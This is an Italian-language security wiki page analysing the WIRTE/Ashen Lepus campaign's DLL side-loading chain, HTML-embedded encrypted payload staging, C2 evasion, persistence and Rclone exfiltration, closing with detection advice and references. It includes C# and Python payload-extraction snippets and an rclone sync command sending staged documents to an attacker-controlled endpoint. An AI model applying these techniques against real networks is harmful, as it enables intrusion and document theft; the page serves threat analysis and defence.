# Avanzato DLL Side-Loading Con HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica del tradecraft

Ashen Lepus (aka WIRTE) ha sfruttato un pattern ripetibile che concatena DLL sideloading, staged HTML payloads e backdoor modulari .NET per persistere nelle reti diplomatiche del Medio Oriente. La tecnica è riutilizzabile da qualunque operatore perché si basa su:

- **Archive-based social engineering**: PDF benigni istruiscono i bersagli a scaricare un archivio RAR da un sito di file-sharing. L'archivio include un EXE viewer di documenti dall'aspetto legittimo, una DLL malevola nominata come una libreria affidabile (es., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), e un esca `Document.pdf`.
- **DLL search order abuse**: la vittima fa doppio clic sull'EXE, Windows risolve l'import della DLL dalla directory corrente, e il loader malevolo (AshenLoader) viene eseguito all'interno del processo affidabile mentre il PDF di esca si apre per evitare sospetti.
- **Living-off-the-land staging**: ogni fase successiva (AshenStager → AshenOrchestrator → modules) è mantenuta off-disk fino al momento del bisogno, consegnata come blob crittografati nascosti all'interno di risposte HTML altrimenti innocue.

## Catena Multi-Fase di Side-Loading

1. **Decoy EXE → AshenLoader**: l'EXE side-loads AshenLoader, che esegue host recon, lo cifra con AES-CTR e lo invia via POST dentro parametri rotanti come `token=`, `id=`, `q=`, o `auth=` verso percorsi che sembrano API (es., `/api/v2/account`).
2. **HTML extraction**: il C2 rivela il passo successivo solo quando l'IP client geolocalizza nella regione target e il `User-Agent` corrisponde all'implant, frustrando le sandbox. Quando i controlli passano il corpo HTTP contiene un blob `<headerp>...</headerp>` con il payload AshenStager cifrato in Base64/AES-CTR.
3. **Second sideload**: AshenStager viene distribuito con un altro binario legittimo che importa `wtsapi32.dll`. La copia malevola iniettata nel binario recupera altro HTML, questa volta estraendo `<article>...</article>` per ricostruire AshenOrchestrator.
4. **AshenOrchestrator**: un controller .NET modulare che decodifica una config JSON in Base64. I campi `tg` e `au` della config vengono concatenati/hashati nella chiave AES, che decripta `xrk`. I byte risultanti fungono da chiave XOR per ogni blob di modulo recuperato successivamente.
5. **Module delivery**: ogni modulo è descritto tramite commenti HTML che reindirizzano il parser a un tag arbitrario, infrangendo regole statiche che cercano solo `<headerp>` o `<article>`. I moduli includono persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) e file exploration (`FE`).

### Pattern di parsing del contenitore HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Anche se i difensori bloccano o rimuovono un elemento specifico, l'operatore deve solo cambiare il tag indicato nel commento HTML per riprendere la consegna.

### Helper di estrazione rapida (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralleli di evasione dello staging HTML

Recenti ricerche su HTML smuggling (Talos) evidenziano payload nascosti come stringhe Base64 all'interno di blocchi `<script>` in allegati HTML e decodificati via JavaScript a runtime. Lo stesso trucco può essere riutilizzato per risposte C2: mettere in stage blob cifrati all'interno di un tag `<script>` (o altro elemento DOM) e decodificarli in-memory prima di AES/XOR, facendo sembrare la pagina HTML ordinaria. Talos mostra anche obfuscazione a strati (identifier renaming più Base64/Caesar/AES) all'interno di tag `<script>`, che si mappa chiaramente ai blob C2 stageati in HTML.

## Note sulle varianti recenti (2024-2025)

- Check Point ha osservato campagne WIRTE nel 2024 che si basavano ancora sullo sideloading tramite archivi ma usavano `propsys.dll` (stagerx64) come primo stage. Lo stager decodifica il payload successivo con Base64 + XOR (chiave `53`), invia richieste HTTP con un `User-Agent` hardcoded ed estrae blob cifrati incorporati tra tag HTML. In un ramo, lo stage è stato ricostruito da una lunga lista di stringhe IP incorporate decodificate tramite `RtlIpv4StringToAddressA`, poi concatenate nei byte del payload.
- OWN-CERT ha documentato tooling WIRTE precedente in cui il dropper side-loaded `wtsapi32.dll` proteggeva le stringhe con Base64 + TEA e usava il nome della DLL come chiave di decrittazione, poi offuscava i dati di identificazione host con XOR/Base64 prima di inviarli al C2.

## Rafforzamento Crypto & C2

- **AES-CTR ovunque**: i loader attuali incorporano chiavi a 256 bit più nonces (es., `{9a 20 51 98 ...}`) e opzionalmente aggiungono un layer XOR usando stringhe come `msasn1.dll` prima/dopo la decrittazione.
- **Variazioni sul materiale chiave**: i loader precedenti usavano Base64 + TEA per proteggere stringhe incorporate, con la chiave di decrittazione derivata dal nome della DLL malevola (es., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: i server di staging sono separati per tool, ospitati su ASN diversi e talvolta mascherati da subdomain dal look legittimo, quindi bruciare uno stage non espone il resto.
- **Recon smuggling**: i dati enumerati ora includono listing di Program Files per individuare app di alto valore e vengono sempre cifrati prima di uscire dall'host.
- **URI churn**: i parametri di query e i percorsi REST ruotano tra le campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando rilevazioni fragili.
- **User-Agent pinning + safe redirects**: l'infrastruttura C2 risponde solo a stringhe UA esatte e altrimenti reindirizza a siti di news/salute benigni per mimetizzarsi.
- **Gated delivery**: i server sono geo-fenced e rispondono solo a implant reali. Client non approvati ricevono HTML non sospetto.

## Persistenza e ciclo di esecuzione

AshenStager crea attività pianificate che si mascherano da job di manutenzione di Windows e vengono eseguite tramite `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Queste attività rilanciano la catena di sideloading all'avvio o a intervalli, permettendo ad AshenOrchestrator di richiedere moduli freschi senza toccare nuovamente il disco.

## Uso di client di sync benigni per l'esfiltrazione

Gli operatori stageano documenti diplomatici dentro `C:\Users\Public` (leggibili da tutti e non sospetti) tramite un modulo dedicato, poi scaricano il binario legittimo di [Rclone](https://rclone.org/) per sincronizzare quella directory con lo storage controllato dall'attaccante. Unit42 osserva che è la prima volta che questo actor è stato visto usare Rclone per esfiltrazione, in linea con la tendenza più ampia di abusare di strumenti di sync legittimi per confondersi nel traffico normale:

1. **Stage**: copiare/raccogliere i file target in `C:\Users\Public\{campaign}\`.
2. **Configure**: consegnare una config di Rclone che punti a un endpoint HTTPS controllato dall'attaccante (es., `api.technology-system[.]com`).
3. **Sync**: eseguire `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` in modo che il traffico somigli a normali backup cloud.

Poiché Rclone è ampiamente usato per workflow di backup legittimi, i difensori devono concentrarsi su esecuzioni anomale (nuovi binari, remoti sospetti, o sincronizzazioni improvvise di `C:\Users\Public`).

## Punti di rilevamento

- Allertare su **processi firmati** che inaspettatamente caricano DLL da percorsi scrivibili dall'utente (filtri Procmon + `Get-ProcessMitigation -Module`), specialmente quando i nomi delle DLL coincidono con `netutils`, `srvcli`, `dwampi`, o `wtsapi32`.
- Ispezionare risposte HTTPS sospette per **grandi blob Base64 incorporati dentro tag insoliti** o protetti da commenti `<!-- TAG: <xyz> -->`.
- Estendere la ricerca HTML a **stringhe Base64 dentro blocchi `<script>`** (staging in stile HTML smuggling) che vengono decodificate via JavaScript prima del processamento AES/XOR.
- Cercare **attività pianificate** che eseguono `svchost.exe` con argomenti non da servizio o che puntano a directory del dropper.
- Monitorare **C2 redirects** che restituiscono payload solo per esatte stringhe `User-Agent` e altrimenti rimbalzano verso domini news/health legittimi.
- Monitorare la presenza di binari **Rclone** fuori da location gestite dall'IT, nuovi file `rclone.conf`, o job di sync che prelevano da directory di staging come `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
